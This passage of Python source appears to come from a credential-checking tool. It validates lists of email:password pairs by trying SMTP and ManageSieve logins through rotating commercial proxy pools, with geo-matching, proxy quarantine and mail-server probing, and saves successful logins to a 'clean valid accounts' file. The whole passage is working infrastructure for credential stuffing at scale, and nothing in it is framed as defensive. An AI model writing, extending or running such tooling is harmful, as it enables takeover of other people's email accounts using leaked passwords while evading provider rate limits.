        s = _raw_socket(server, port, proxy_str, timeout=to)
        if int(port) == 465:
            s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))

        banner = _smtp_read_reply(s)
        if not banner.startswith("220"):
            raise SmtpSoftError(f"banner not 220: {banner[:60]!r}")

        ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
        caps = ehlo.upper()
        if "STARTTLS" in caps and int(port) != 465:
            r = _smtp_cmd(s, "STARTTLS")
            if r.startswith("220"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
                caps = ehlo.upper()
        if "AUTH" not in caps:
            raise SmtpSoftError("server does not advertise AUTH")

        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()

        r = _smtp_cmd(s, f"AUTH PLAIN {payload}")
        if r.startswith("334"):
            r = _smtp_cmd(s, payload)

        low = r.lower()
        if r.startswith("504") or "unrecognized" in low or "not supported" in low:
            r2 = _smtp_cmd(s, "AUTH LOGIN")
            if r2.startswith("334"):
                _smtp_cmd(s, base64.b64encode(who.encode()).decode())
                r = _smtp_cmd(s, base64.b64encode(password.encode()).decode())
            else:
                r = r2
            low = r.lower()

        if r.startswith("235"):
            return True
        if (r.startswith("535") or "authentication failed" in low
                or "invalid credentials" in low
                or "username and password not accepted" in low):
            raise SmtpAuthError(f"SMTP AUTH rejected: {r[:90]}")
        raise SmtpSoftError(f"SMTP AUTH inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                _smtp_cmd(s, "QUIT", quiet=True)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 065 SMTP_AUTH

# @@BLOCK 066 SIEVE_AUTH deps=011,023,061
def sieve_auth_once(email, password, server, proxy_str=None, insecure=None,
                    port=SIEVE_PORT, attempt_timeout=None, user=None):
    """Confirm-only ManageSieve (RFC 5804) AUTH.  Same credentials, port 4190."""
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    s = None
    try:
        s = _raw_socket(server, port, proxy_str, timeout=to)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))
        greet = s.recv(600).decode("utf-8", errors="ignore")
        if not greet:
            raise SieveSoftError("no ManageSieve greeting")
        up = greet.upper()
        if "SIEVE" not in up and "IMPLEMENTATION" not in up:
            raise SieveSoftError(f"not a ManageSieve greeting: {greet[:60]!r}")
        if "STARTTLS" in up:
            s.sendall(b"STARTTLS\r\n")
            r = s.recv(300).decode("utf-8", errors="ignore")
            if r.startswith("OK"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                s.recv(600)
        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()
        s.sendall(f'AUTHENTICATE "PLAIN" "{payload}"\r\n'.encode())
        r = s.recv(600).decode("utf-8", errors="ignore")
        up = r.upper()
        if up.startswith("OK"):
            return True
        if (up.startswith("NO") or "AUTHENTICATIONFAILED" in up
                or "INVALID" in up or "AUTHENTICATION FAILED" in up):
            raise SieveAuthError(f"ManageSieve AUTH rejected: {r[:90]}")
        raise SieveSoftError(f"ManageSieve inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                s.sendall(b"LOGOUT\r\n")
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 066 SIEVE_AUTH

# @@BLOCK 067 ERROR_CLASSIFY deps=016,017,022,023,039
def classify_error(err, domain=""):
    try:
        err_str = str(err)
        if domain in ZERO_ACCESS_PROVIDERS:
            return APP
        return st_classify(err_str, domain)
    except Exception:
        return UNKNOWN


def _is_proxy_level_error(msg):
    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset."""
    try:
        return st_proxy_level(msg)
    except Exception:
        s = (msg or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))


def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_auth=False):
    try:
        if not proxy_str:
            return
        if is_proxy_auth and CFG.get("QUARANTINE_407", True):
            _park_proxy_407(proxy_str)
            if not proxy_is_quarantined(proxy_str):
                with proxy_quarantine_lock:
                    _proxy_407[proxy_str] += 1
                    strikes = _proxy_407[proxy_str]
                if strikes >= PROXY_407_QUARANTINE:
                    quarantine_proxy(proxy_str, f"{strikes}x 407")
        threshold = int(CFG.get("BLACKLIST_CF", BLACKLIST_CF_DEFAULT))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown",
                                         "region": "Unknown", "latency_ms": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                if is_network_error:
                    consecutive_proxy_failures[proxy_str] += 1
                    if consecutive_proxy_failures[proxy_str] >= threshold:
                        circuit_breaker_until[proxy_str] = time.time() + CIRCUIT_BREAKER_SECONDS
                        consecutive_proxy_failures[proxy_str] = 0
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
    except Exception as e:
        warnings.warn(f"Error recording proxy attempt: {e}")
# @@END 067 ERROR_CLASSIFY

# @@BLOCK 068 SMTP_PRECHECK deps=043,059,061,065
def _smtp_banner_ok(hosts, px, timeout=3.5):
    for h in hosts:
        for port, use_tls in ((587, False), (465, True), (25, False)):
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=timeout)
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(timeout)
                banner = s.recv(200)
                if banner[:3] == b"220":
                    return True
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    return False


def smtp_domain_probe(domain, timeout=3.5):
    try:
        hosts = host_smtp_candidates(domain) or []
    except Exception:
        hosts = []
    if not hosts:
        return None

    live = [h for h in hosts[:2] if fast_fail_dns_check(h)]
    if not live:
        return False

    if _smtp_banner_ok(live, None, timeout):
        return True

    with alive_pool_lock:
        have_pool = bool(alive_pool)
    if have_pool and CFG.get("PROXY_MODE", "fallback") != "off":
        if _smtp_banner_ok(live, sample_alive_proxy(domain=domain), timeout):
            return True
    return False


def smtp_cached(domain):
    with _SMTP_LOCK:
        hit = _SMTP_DOMAIN_CACHE.get(domain)
    return bool(hit and (time.time() - hit[0]) < _SMTP_CACHE_TTL)


def smtp_precheck_domains(domains, max_workers=None, budget=None):
    max_workers = max_workers or _SMTP_PRECHECK_WORKERS
    budget = budget or _SMTP_PRECHECK_BUDGET

    results = {}
    doms = [d for d in dict.fromkeys(d for d in (domains or []) if d)]
    if not doms:
        return results

    now = time.time()
    todo = []
    with _SMTP_LOCK:
        for d in doms:
            hit = _SMTP_DOMAIN_CACHE.get(d)
            if hit and (now - hit[0]) < _SMTP_CACHE_TTL:
                results[d] = hit[1]
            else:
                todo.append(d)

    if not todo:
        return results

    deadline = time.time() + budget
    try:
        with ThreadPoolExecutor(max_workers=min(max_workers, len(todo))) as ex:
            futs = {ex.submit(smtp_domain_probe, d): d for d in todo}
            for fut in as_completed(futs, timeout=max(1.0, deadline - time.time())):
                d = futs[fut]
                try:
                    res = fut.result()
                except Exception:
                    res = None
                results[d] = res
                with _SMTP_LOCK:
                    _SMTP_DOMAIN_CACHE[d] = (time.time(), res)
    except Exception as e:
        log_startup(f"WARNING: SMTP pre-check batch timeout/error: {e}", quiet=True)

    for d in todo:
        results.setdefault(d, None)
    return results


def smtp_failed_check(domain, px, trace_logs):
    try:
        hosts = host_smtp_candidates(domain)
    except Exception:
        hosts = []
    if not hosts:
        trace_logs.append("SMTP failed check: no SMTP candidate hosts discovered")
        return None
    attempted = 0
    for h in hosts[:2]:
        if not fast_fail_dns_check(h):
            trace_logs.append(f"SMTP failed check: {h} does not resolve locally")
            continue
        for port, use_tls in ((587, False), (465, True), (25, False)):
            attempted += 1
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(
                    CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(min(6.0, max(3.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                banner = s.recv(200)
                if banner[:3] == b"220":
                    trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
                    return True
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: "
                                  f"unexpected banner {banner[:40]!r}")
            except Exception as e:
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: {str(e)[:90]}")
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    if attempted:
        trace_logs.append("SMTP failed check -> all SMTP candidates failed")
        return False
    trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
    return None


def _smtp_hosts_for(domain, cap=SMTP_HOST_CAP):
    """First SMTP submission host, preferring an explicit smtp.<domain>."""
    try:
        hosts = [h for h in (host_smtp_candidates(domain) or []) if h]
    except Exception:
        hosts = []
    if not hosts:
        return []
    if not hosts[0].lower().startswith("smtp"):
        for i, h in enumerate(hosts):
            if h.lower().startswith("smtp"):
                hosts.insert(0, hosts.pop(i))
                break
    return hosts[:cap]
# @@END 068 SMTP_PRECHECK

# @@BLOCK 069 POOL_SAMPLE deps=052
def sample_alive_proxy(exclude=None, domain=None, avoid=None):
    """RANDOM ROTATION with an account-level avoid set."""
    exclude = set(exclude or ())
    avoid = set(avoid or ())
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        return None

    if CFG.get("QUARANTINE_407", True):
        with proxy_quarantine_lock:
            q = set(proxy_quarantine)
        fresh = [p for p in pool if p not in q]
        if not fresh and q:
            with alive_pool_lock:
                whole = set(alive_pool)
            if whole and q >= whole:
                with proxy_quarantine_lock:
                    proxy_quarantine.clear()
                _proxy_407.clear()
                try:
                    STATE.setdefault("proxy_407_until", {}).clear()
                except Exception:
                    pass
                log_startup("Quarantine lifted: every pool node had 407'd - retrying them all.",
                            quiet=True)
                log_probe_event("quarantine auto-lifted (whole pool was quarantined)")
            fresh = pool
        if fresh:
            pool = fresh

    if CFG.get("GEO_CALL", False) and domain:
        want = tld_country(domain)
        if want:
            matched = [p for p in pool
                       if str(proxy_meta.get(p, {}).get("country", "")).lower() == want.lower()]
            if matched:
                pool = matched

    if CFG.get("QUARANTINE_407", True):
        unparked = [p for p in pool if not _proxy_407_parked(p)]
        if unparked:
            pool = unparked

    cand = [p for p in pool if p not in exclude and p not in avoid]
    if not cand:
        cand = [p for p in pool if p not in exclude]
    if not cand:
        cand = pool

    if not CFG.get("RANDOM_ROTATION", True):
        with STATE["rr_lock"]:
            STATE["rr_index"] = (STATE["rr_index"] + 1) % len(pool)
            return pool[STATE["rr_index"]]

    with STATE["rr_lock"]:
        last = STATE.get("rr_last")
        if len(cand) > 1 and last in cand:
            cand = [p for p in cand if p != last]
        pick = random.choice(cand)
        STATE["rr_last"] = pick
        return pick
# @@END 069 POOL_SAMPLE

# @@BLOCK 070 TUNNEL_PROBE deps=023,052,053
def tunnel_probe(proxy_str, targets=None, timeout=None):
    """Open a REAL CONNECT tunnel through the node and classify the outcome.

    A 407 arriving on ANY scheme is an auth refusal, decided AFTER the loops -
    the node's scheme memory is driven by an actual SUCCESS only.  A FAILURE
    always tries the alternate scheme.
    """
    out = {"ok": False, "reason": "dead", "latency_ms": 0, "target": "",
           "scheme": None, "error": ""}
    if not proxy_str:
        out["ok"] = True
        out["reason"] = "ok"
        return out
    info = parse_proxy(proxy_str)
    if not info:
        out["reason"] = "format"
        out["error"] = "parse_proxy() returned None (unrecognised line shape)"
        return out
    if not SOCKS_OK:
        out["reason"] = "nosocks"
        out["error"] = "PySocks not installed"
        return out

    targets = targets or probe_targets()
    try:
        _max_t = max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    except Exception:
        _max_t = PROBE_MAX_TARGETS_DEFAULT
    targets = list(targets)[:_max_t]
    try:
        _second_scheme = bool(CFG.get("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT))
    except Exception:
        _second_scheme = PROBE_SECOND_SCHEME_DEFAULT

    budget = float(timeout if timeout is not None else probe_timeout())
    hard_deadline = time.time() + max(1.5, budget)

    errors = []
    auth_schemes = set()
    started_all = time.time()

    for host, port, label in targets:
        if time.time() >= hard_deadline:
            errors.append(f"{label}: skipped (node budget spent)")
            break
        for _s_idx, ptype in enumerate(_scheme_order(proxy_str)):
            if _s_idx and out["ok"] and not _second_scheme:
                break
            left = hard_deadline - time.time()
            if left <= 0.6:
                break
            attempt_to = max(0.8, min(budget, left))
            s = None
            started = time.time()
            try:
                kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                      "proxy_port": info["port"], "proxy_rdns": True}
                if info["user"]:
                    kw["proxy_username"] = info["user"]
                    kw["proxy_password"] = info["pass"]
                s = socks.create_connection((host, port), timeout=attempt_to, **kw)
                _remember_scheme(proxy_str, ptype)
                out.update(ok=True, reason="ok", scheme=ptype, target=label,
                           latency_ms=int((time.time() - started_all) * 1000))
            except Exception as e:
                msg = str(e)
                errors.append(f"{label}/{'HTTP' if ptype == socks.HTTP else 'SOCKS5'}: "
                              f"{type(e).__name__}: {msg[:110]}")
                if _is_proxy_auth_fail(msg):
                    auth_schemes.add(ptype)
                elif isinstance(e, (socket.timeout, TimeoutError)) or "timed out" in msg.lower():
                    if out["reason"] != "auth":
                        out["reason"] = "timeout"
                else:
                    if out["reason"] != "auth":
                        out["reason"] = "transport"
                out["target"] = label
                out["latency_ms"] = int((time.time() - started) * 1000)
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
        if out["ok"] and not _second_scheme:
            return out

    if out["ok"]:
        out["reason"] = "ok"
        out["error"] = " ; ".join(errors)[:300]
        return out

    if auth_schemes:
        out["reason"] = "auth"

    out["error"] = " ; ".join(errors)[:300]
    return out
# @@END 070 TUNNEL_PROBE

# @@BLOCK 071 PRECHECK_FAST deps=025,041,058,070
def precheck_proxy_fast(proxy_str):
    try:
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked", error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            log_probe_event(f"FORMAT {proxy_str[:60]}")
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        if not is_proxy_alive(info["host"], info["port"],
                              timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT",
                                                    PROXY_PRECHECK_TIMEOUT_DEFAULT))):
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} failed")
            log_probe_event(f"TCPDEAD {info['host']}:{info['port']}")
            return False

        res = _gated_tunnel(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))

        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str, {"fails": 0, "success": 0, "country": "Unknown",
                                    "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            return True

        if res["reason"] == "auth":
            record_proxy_attempt(proxy_str, success=False, is_network_error=True,
                                 is_proxy_auth=True)
            log_probe_event(f"AUTH407 {info['host']}:{info['port']} -> {res.get('error', '')[:200]}")
        else:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            if res["reason"] in ("timeout", "dead", "transport"):
                log_probe_event(f"{res['reason'].upper()} {info['host']}:{info['port']} "
                                f"-> {res.get('error', '')[:200]}")
        return False
    except Exception:
        return False
# @@END 071 PRECHECK_FAST

# @@BLOCK 072 RUN_BATCH deps=072
def _run_batch(fn, items, workers, budget):
    """Run fn(item) over items with a HARD wall-clock budget."""
    done_ids = set()
    timed_out = False
    if not items:
        return [], False
    ex = ThreadPoolExecutor(max_workers=max(1, min(int(workers), len(items))))
    try:
        f2i = {ex.submit(fn, it): it for it in items}
        try:
            for fut in as_completed(f2i, timeout=budget):
                try:
                    if fut.result():
                        done_ids.add(id(f2i[fut]))
                except Exception:
                    continue
        except Exception:
            timed_out = True
        for fut in f2i:
            if fut.done():
                try:
                    if fut.result():
                        done_ids.add(id(f2i[fut]))
                except Exception:
                    pass
    finally:
        ex.shutdown(wait=False)
    return [it for it in items if id(it) in done_ids], timed_out
# @@END 072 RUN_BATCH

# @@BLOCK 073 MAIL_SPOT_CHECK deps=015,025,070
def _mail_spot_target():
    """The real mail destination to test the pool against."""
    try:
        ov = STATE.get("probe_targets_override") or []
        for h, p, _l in ov:
            if h:
                return (h, int(p))
    except Exception:
        pass
    return MAIL_SPOT_FALLBACK


def mail_dest_spot_check(force: bool = False):
    """CONNECT a few nodes to a MAIL destination and report it."""
    if not force and not CFG.get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        return
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        STATE["mail_spot"] = {"ts": time.time(), "host": "", "port": 0, "ok": 0,
                              "auth": 0, "other": 0, "n": 0, "error": "empty pool"}
        return
    host, port = _mail_spot_target()
    sample = random.sample(pool, min(MAIL_SPOT_NODES, len(pool)))
    ok = auth = other = 0
    err = ""
    for p in sample:
        try:
            res = tunnel_probe(p, targets=[(host, port, "mailspot")], timeout=MAIL_SPOT_TIMEOUT)
        except Exception as e:
            other += 1
            err = err or f"{type(e).__name__}: {str(e)[:120]}"
            continue
        if res.get("ok"):
            ok += 1
        elif res.get("reason") == "auth":
            auth += 1
            err = err or (res.get("error", "") or "")
        else:
            other += 1
            err = err or (res.get("error", "") or "")
    STATE["mail_spot"] = {"ts": time.time(), "host": host, "port": int(port), "ok": ok,
                          "auth": auth, "other": other, "n": len(sample),
                          "error": (err or "")[:300]}
    line = (f"mail-dest spot check {host}:{port} -> pass={ok} 407={auth} "
            f"other={other} of {len(sample)} node(s)")
    log_probe_event(line)
    if auth and not ok:
        log_probe_event("*** pool passes the WEB probe but the provider 407s MAIL "
                        "destinations - check the 'email servers' cap ***")
# @@END 073 MAIL_SPOT_CHECK

# @@BLOCK 074 REFRESH_POOL deps=013,014,025,058,069,071,073
def refresh_alive_pool(force: bool = False, budget: float = None):
    budget = float(budget if budget is not None else PROBE_BATCH_BUDGET)

    if (not force) and (not STATE.get("run_active")) \
            and not CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        return

    if not _PROBE_OWNER_LOCK.acquire(blocking=False):
        if not force:
            return
        _t0 = time.time()
        while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < budget:
            time.sleep(0.2)
        if not _PROBE_OWNER_LOCK.acquire(blocking=False):
            return

    if (not force) and STATE.get("run_active"):
        last = STATE.get("last_probe_ts", 0.0)
        if last and (time.time() - last) < PROBER_STALE_WHILE_RUNNING:
            try:
                _PROBE_OWNER_LOCK.release()
            except Exception:
                pass
            return

    STATE["probe_in_flight"] = True
    try:
        try:
            raw = get_filtered_active_proxies(quiet=True)
        except Exception:
            raw = []
        if not raw:
            with alive_pool_lock:
                alive_pool[:] = []
            log_startup("Alive pool refreshed: proxies.txt is empty.", quiet=True)
            return

        try:
            _sample = max(0, int(CFG.get("PROBE_SAMPLE_MAX", 0)))
        except Exception:
            _sample = 0
        if _sample and len(raw) > _sample:
            raw = random.sample(raw, _sample)
            log_probe_event(f"probe sample: {_sample} node(s) this cycle")

        try:
            file_keys = set(load_proxies(quiet=True))
        except Exception:
            file_keys = set()
        if file_keys:
            with proxy_lock:
                for k in list(proxy_meta.keys()):
                    if k not in file_keys:
                        proxy_meta.pop(k, None)
            with probe_stats_lock:
                for k in list(probe_stats.keys()):
                    if k not in file_keys:
                        probe_stats.pop(k, None)
            with proxy_quarantine_lock:
                for k in list(proxy_quarantine):
                    if k not in file_keys:
                        proxy_quarantine.discard(k)
                        _proxy_407.pop(k, None)
            with _proxy_scheme_lock:
                for k in list(_proxy_scheme.keys()):
                    if k not in file_keys:
                        _proxy_scheme.pop(k, None)

        if not CFG.get("PROXY_TEST_FLIGHT", True):
            with alive_pool_lock:
                alive_pool[:] = raw
            enrich_proxy_geo(raw)
            save_proxy_meta()
            log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) "
                        f"without probing.", quiet=True)
            try:
                mail_dest_spot_check()
            except Exception as _mse:
                log_probe_event(f"mail-dest spot check failed: {_mse}")
            return

        _tgts = probe_targets()
        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={CFG.get('PROBE_TARGET')} "
                        f"({[t[0] for t in _tgts]}), budget={budget:.0f}s, "
                        f"workers={probe_workers()}")

        live, batch_timed_out = _run_batch(precheck_proxy_fast, raw, probe_workers(), budget)

        strict = bool(CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT))
        note = ""
        if not live and not strict:
            live = raw
            note = " | STRICT OFF: fell back to the raw pool"
        elif not live and batch_timed_out:
            note = f" | probe batch budget ({budget:.0f}s) spent"

        if not live and STATE.get("run_active"):
            with alive_pool_lock:
                still = [p for p in alive_pool if p]
            if still:
                note += f" | kept the current {len(still)}-node pool (run in flight)"
                log_probe_event(f"refresh kept pool ({len(still)} nodes) - 0 passed under load")
                try:
                    mail_dest_spot_check()
                except Exception as _mse:
                    log_probe_event(f"mail-dest spot check failed: {_mse}")
                return

        with alive_pool_lock:
            alive_pool[:] = live
        enrich_proxy_geo(live)
        save_proxy_meta()
        STATE["last_probe_ts"] = time.time()
        STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1

        try:
            mail_dest_spot_check()
        except Exception as _mse:
            log_probe_event(f"mail-dest spot check failed: {_mse}")

        passed, auth, timeout_n, dead = probe_summary()
        line = (f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
                f"out of {len(raw)} candidate(s). Probe breakdown -> pass={passed} "
                f"auth407={auth} timeout={timeout_n} dead={dead} | "
                f"target={CFG.get('PROBE_TARGET')} budget={budget:.0f}s strict={strict}{note}")
        log_startup(line, quiet=True)
        log_probe_event(f"refresh end: alive={len(live)}/{len(raw)} pass={passed} "
                        f"auth={auth} timeout={timeout_n} dead={dead}{note}")
    finally:
        STATE["probe_in_flight"] = False
        STATE["last_probe_ts"] = time.time()
        try:
            _PROBE_OWNER_LOCK.release()
        except Exception:
            pass
# @@END 074 REFRESH_POOL

# @@BLOCK 075 ALIVE_THREAD deps=013,074
def start_alive_refresher():
    if any(t.name == "alive-pool" for t in threading.enumerate()):
        return

    def loop():
        while True:
            try:
                if STATE.get("run_active"):
                    refresh_alive_pool()
                    time.sleep(PROBER_BUSY_SLEEP)
                else:
                    refresh_alive_pool()
                    time.sleep(PROBER_IDLE_SLEEP)
            except Exception:
                time.sleep(PROBER_BUSY_SLEEP)

    threading.Thread(target=loop, daemon=True, name="alive-pool").start()


start_alive_refresher()
# @@END 075 ALIVE_THREAD

# @@BLOCK 076 QUEUE_PROBE_TARGETS deps=011,026,068
def _probe_pair_for(email, domain, flags):
    """The AUTO probe target follows the SELECTED protocols."""
    if flags.get("imap"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], 993)
    if flags.get("pop"):
        h = (get_servers(email).get("pop") or [])[:1]
        if h:
            return (h[0], 995)
    if flags.get("smtp"):
        h = _smtp_hosts_for(domain)
        if h:
            return (h[0], 587)
    if flags.get("sieve"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], SIEVE_PORT)
    return None


def _set_probe_targets_from_queue(accounts, cap=1):
    """Resolve the AUTO probe target from the ACTUAL queue."""
    flags = protocol_flags()
    out, seen_domains, seen_pairs = [], set(), set()
    for raw in accounts or []:
        em = raw.split(":", 1)[0].strip().lower()
        if "@" not in em:
            continue
        dom = em.split("@")[-1]
        if not dom or dom in seen_domains:
            continue
        seen_domains.add(dom)
        try:
            pair = _probe_pair_for(em, dom, flags)
        except Exception:
            pair = None
        if not pair or pair in seen_pairs:
            continue
        seen_pairs.add(pair)
        out.append((pair[0], pair[1], f"auto:{dom}"))
        if len(out) >= cap:
            break
    if out:
        STATE["probe_targets_override"] = out
        log_probe_event(f"probe target AUTO resolved from the queue -> {[o[0] for o in out]}")
    return out
# @@END 076 QUEUE_PROBE_TARGETS

# @@BLOCK 077 FETCH_AND_TEST deps=014,025,058,071,073
def fetch_and_test_all_proxies(silent: bool = False):
    """Fetch every configured provider's lines, validate them, write proxies.txt
    and ARM the live pool.  Returns (alive_count, total_count).
    """
    global all_proxies, filtered_pool

    if requests is None:
        if not silent:
            str_lit.error("Missing 'requests' library.")
        return (0, 0)

    log_startup("Bulk fetch & test of Webshare / Oxylabs proxies started.")
    all_raw = []

    def fetch_ws(key):
        """PAGINATE.  Reading page 1 and stopping loses every later line."""
        proxies = []
        try:
            page = 1
            while page <= 20:
                r = requests.get(
                    "https://proxy.webshare.io/api/v2/proxy/list/",
                    params={"mode": "direct", "page": page, "page_size": 250},
                    headers={"Authorization": f"Token {key}"}, timeout=8)
                if r.status_code != 200:
                    break
                data = r.json() or {}
                results = data.get("results") or []
                for item in results:
                    ip, port = item.get("proxy_address"), item.get("port")
                    user, pwd = item.get("username"), item.get("password")
                    if ip and port:
                        proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd
                                       else f"{ip}:{port}")
                nxt = data.get("next")
                if not nxt or not results or len(results) < 250:
                    break
                page += 1
        except Exception as e:
            warnings.warn(f"Failed fetching Webshare proxy key: {e}")
        return proxies

    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            for res in executor.map(fetch_ws, WEBSHARE_KEYS):
                all_raw.extend(res)
    except Exception as e:
        warnings.warn(f"ThreadPool Webshare fetch error: {e}")

    all_raw.extend(OXYLABS_PROXIES)
    all_raw = list(dict.fromkeys(all_raw))
    total = len(all_raw)

    if not all_raw:
        log_startup("Fetch & test: no proxy lines returned.")
        if not silent:
            str_lit.warning("No proxies returned. Check WEBSHARE_KEYS in secrets.")
        return (0, 0)

    # The write below replaces proxies.txt with ONLY the survivors, so a
    # provider-wide 407 could shrink your pool with no way back.  proxies_all.txt
    # is the way back - and there is a Restore button.
    try:
        with file_write_lock:
            with open("proxies_all.txt", "w", encoding="utf-8") as _bf:
                _bf.write("\n".join(str(i) for i in all_raw) + ("\n" if all_raw else ""))
        log_startup(f"Backed up the raw fetched pool to proxies_all.txt ({len(all_raw)} line(s)).")
    except Exception as _bex:
        log_startup(f"WARNING: could not write proxies_all.txt: {_bex}")

    clear_tunnel_cache()
    with probe_stats_lock:
        probe_stats.clear()
    clear_proxy_quarantine()

    batch_timeout = max(60.0, min(PROBE_BATCH_BUDGET * 3.0, len(all_raw) * 3.0))
    alive, _ft_timed_out = _run_batch(precheck_proxy_fast, all_raw,
                                      probe_workers(bulk=True), batch_timeout)
    if _ft_timed_out:
        log_startup(f"Fetch & test: batch budget {batch_timeout:.0f}s spent; "
                    f"keeping the {len(alive)} node(s) that finished.")

    alive = list(dict.fromkeys(alive))

    if not alive:
        tcp_ok = []
        _pt = float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))
        for p in all_raw:
            info = parse_proxy(p)
            if info and is_proxy_alive(info["host"], info["port"], timeout=_pt):
                tcp_ok.append(p)
        alive = tcp_ok or all_raw
        log_startup(f"Fetch & test: 0 nodes passed the tunnel probe; "
                    f"fell back to {len(alive)} TCP-alive line(s).")

    try:
        with file_write_lock:
            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                f.write("\n".join(str(i) for i in alive) + ("\n" if alive else ""))
    except Exception as ex:
        str_lit.error(f"Failed to write proxies file: {ex}")

    # ARM THE POOL: no cold re-probe needed at Start
    with alive_pool_lock:
        alive_pool[:] = list(alive)
    try:
        enrich_proxy_geo(alive)
    except Exception:
        pass
    save_proxy_meta()
    STATE["last_probe_ts"] = time.time()
    STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1
    STATE["bootstrap_done"] = True

    try:
        mail_dest_spot_check(force=True)
    except Exception as _mse:
        log_probe_event(f"mail-dest spot check failed: {_mse}")

    all_proxies = load_proxies()
    filtered_pool = get_filtered_active_proxies(quiet=True)

    log_startup(f"Fetch & test complete: {len(alive)}/{total} node(s) validated, "
                f"written and ARMED.")
    return (len(alive), total)
# @@END 077 FETCH_AND_TEST

# @@BLOCK 078 CLEAN_VALID_IO deps=039
CLEAN_VALID_FILE = "clean_valid_accounts.txt"


def _read_clean_valid():
    """email(lower) -> password, for whatever is on disk right now."""
    seen = {}
    try:
        if os.path.exists(CLEAN_VALID_FILE):
            with open(CLEAN_VALID_FILE, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    em, rest = line.split(":", 1)
                    em = em.strip().lower()
                    if em and em not in seen:
                        seen[em] = rest.split("|")[0].strip()
    except Exception:
        pass
    return seen


def _write_clean_valid(header, valids):
    """Merge `valids` into clean_valid_accounts.txt and rewrite the file."""
    merged = _read_clean_valid()
    for v in valids or []:
        if ":" not in v:
            continue
        em, rest = v.split(":", 1)
